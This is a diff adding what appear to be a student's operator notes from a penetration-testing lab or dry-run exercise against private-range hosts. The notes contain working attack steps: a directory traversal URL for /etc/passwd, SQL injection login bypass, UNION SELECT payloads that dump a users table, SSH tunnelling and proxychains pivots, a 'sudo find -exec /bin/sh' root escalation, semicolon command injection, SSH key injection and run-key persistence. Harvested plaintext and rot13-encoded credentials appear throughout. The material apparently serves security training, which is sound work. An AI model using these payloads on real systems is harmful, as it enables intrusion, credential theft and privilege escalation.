@@ -1,0 +1,196 @@
+### PASSWORDS
+YOPA-003-M 10.50.26.152USER
+system_user=user2
+user_password= EaglesIsARE78
+user3--- Bob4THEEapples
+Lee_Roth---- anotherpassword4THEages
+AAron ---- apasswordyPa$$word
+
+### OPNOTES
+went to 10.50.26.152 webstite
+clicked JOB OPENINGS
+http://10.50.26.152/getcareers.php?myfile=../../../../../../../../../etc/passwd
+
+nikto v -h 10.50.26.152
+http://10.50.26.152/script
+cat /etc/hosts!!!!!
+
+
+#############################################################################################################################
+
+DRYRUN REVIEW
+
+
+=============================================================================================================================
+Target 10.50.26.152
+
+
+================================================================================
+CREDZ
+Aaron   apasswordyPa$$word
+Lroth   anotherpassword4THEages
+user2   EaglesIsARE78
+user3   Bob4THEEapples
+================================================================================
+
+================================================================================
+
+10.50.24.84
+
+nmap -Pn T4 -sT 10.50.26.152  -p22,80
+Nmap scan report for 192.168.26.152
+Host is up (0.0010s latency).
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+firefox
+++++++++++++++++++++++++++
+10.50.26.152
+BROWSE SITE--see whats possibly vulnerable
+Whats on page
+000000000000000000000000000000000000000
+http://10.50.26.152/login.html --- POSSIBLE SQL
+http://10.50.26.152/getcareers.php?myfile=D&submit=File+look+up --- POSSIBLE DIRECTORY TRAVESAL
+http://10.50.26.152/apply.html --- POSSIBLE MALICIOUS UPLOAD
+0000000000000000000000000000000000000000
+nmap -Pn -T4 -sT 10.50.26.152 --script http-enum.nse
+nikto -h 10.50.26.152
+==========================================
+SQL INJECTION
+login page
+'or 1 ='1 --username/passwd
+f12 NETWORK --REQUEST ---RAW COPY PASTE AFTER PHP?
+Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1
+encoded in rot13
+cat /etc/passwd ==== user2 is only user
+=====================================
+sign in using ssh
+sudo -l
+find / -type f -perm /(2|4|6)000 2>/dev/null
+cat /etc/hosts
+192.168.28.181 WebApp
+for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+181 172 190(ROUTER CAUSE ttl 64)
+=====================================
+Dynamic tunnel to 10.50.26.152
+sudo proxychains nmap -Pn -sT -T4 -p22,80,445 192.168.28.181,172 2>/dev/null
+=====================================
+192.168.28.181
+PORT  STATE    SERVICE
+22    open     ssh
+80    open     http
+=====================================
+192.168.28.172
+PORT  STATE    SERVICE
+22    open     ssh
+=====================================
+ssh -S /tmp/b1 -O forward -L1111:192.168.28.181:80
+
+00000000000000000000000000000000000000000000000000000000000000000000000000000000
+HAS TABLES WHEN PRESSED BUTTONS
+(((( 192.168.28.181))))
+127.0.0.1:1234/pick.php?product=1 OR 1=1
+127.0.0.1:1234/pick.php?product=7 OR 1=1
+Item 	On Hand 	Price
+Monitors 	88 	$250
+Mouse 	21 	$25000
+Cat5 	55 	$100
+CAT5e 	900 	$50
+Speakers 	4 	$450
+Tablets 	16 	$300
+HAM 	32 	$15
+Fiber 	1 	$10000
+http://127.0.0.1:1111/pick.php?product=7 UNION SELECT 1,2,3;#
+Item 	On Hand 	Price
+HAM 	32 	$15
+1 	3 	$2
+http://127.0.0.1:1111/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
+GOT WHOLE TABLE
+http://127.0.0.1:1111/pick.php?product=7UNION SELECT user_id,name,username FROM siteusers.users;#
+got everyones rot13 passwords/usernames
+1 	ncnffjbeqlCn$$jbeq 	$Aaron
+2 	RntyrfVfNER78 	$user2
+3 	Obo4GURRnccyrf 	$user3
+4 	anotherpassword4THEages 	$Lroth
+=====================================
+192.168.28.181
+ssh to port 22
+try every cred twice
+not able to login
+=====================================
+TRY NEXT IP
+ssh -S /tmp/b1 -O forward -L 1116:192.168.28.172:22 aaaa
+ssh -MS /tmp/b2 Aaron@127.0.0.1 -p 1116
+sudo -l ---- find
+sudo find . -exec /bin/sh \; -quit
+whoami ==root ===we win this Box
+cat /etc/hosts---gives nothing
+ping sweep ---- find 192.168.28.179
+=====================================
+make proxychains to 192.168.28.172
+proxychains nmap -Pn T4 -sT 192.168.28.179
+=====================================
+192.168.28.179
+PORT  STATE    SERVICE
+445    open    ALWAYS SMB
+3389   open    ALWAYS RDP
+9999   open    bannergrab ---- for sevureserv
+
+tunnel to 3389
+tunnel to 9999
+xfreerdp /v:127.0.0.1:9934 /u:Lroth +clipboard +glyph-cache +dynamic-resolution
+open services ---find funny services----secureserver
+c:\programfiles\SecureServer
+=====================================
+IF COMMAND INJECTION =----> UPLOAD SSHKEY
+IF YOU SEE A WALL OF TEXT VIEW PAGE SOURCE------> YOU MIGHT SEE A LINK
+CAT /ETC/HOSTS PLSSSS
+IF DLL FIND IT through sysinternal or
+IF EXE FIND exe replace with givin exe
+view file extentision / view hidden
+=====================================
+SSHKEY INJECTION
+uploads
+after upload find where it saves, go there excecute
+
+====================================
+sshkey upload
+copy sshkeygen file
+PASTE INTO cmd injection
+ssh into user@ip (no password needed)
+=======================================
+COMMAND Injection
+ADD SEMICOLAN BEFORE COMMANDS
+;whoami
+
+
+
+
+======================================
+
+
+
+BINARY ANALYSIS
+EXPLOIT DEVELOPMENT
+RECONNAISSNACE ---scan/ping/hosts/s a
+SQL INJECTION ----ton of points
+NO CROSS SITE SCRIPTING
+ssh key injcetion!!
+WINDOWS EXPLOITATION
+DLl/EXE HIJACKING
+after meterpreter run shell
+WINBUFF is in /home/Student
+
+=======================================
+REVERSE ENGINEERING
+
+PRINTF IS NOT THE Function
+look for custom functions
+=========================================
+BUFFEROVERFLOW OPNOTES=====IS IN /home/student.bak/buff.py
+
+==========================================
+WINDOWS
+how to check audit policy
+auditpol /get /category:* | findstr /i "success failure"
+PERSISTENCE IS RUN KEY
